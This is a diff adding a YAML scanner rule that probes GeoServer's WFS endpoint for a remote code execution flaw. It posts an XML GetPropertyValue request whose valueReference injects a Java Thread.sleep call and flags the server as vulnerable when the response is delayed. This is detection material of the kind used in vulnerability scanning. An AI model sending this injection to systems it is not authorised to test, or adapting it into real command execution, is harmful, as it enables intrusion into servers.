@@ -1,0 +1,15 @@
+name: geoserver-rce
+rules:
+  - method: POST
+    path: "/geoserver/wfs"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <wfs:GetPropertyValue service='WFS' version='2.0.0' valueReference='java.lang.Thread.sleep(6000)' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0' xmlns:sf='http://www.openplans.org/spearfish'> <wfs:Query typeNames='qx:city'/></wfs:GetPropertyValue>
+    expression: |
+      response.status == 200 && response.duration >= 6
+detail:
+  author: lxy
+  links:
+    - https://github.com/geoserver/geoserver
+  description: "GeoServer 命令执行漏洞（时间盲注）"
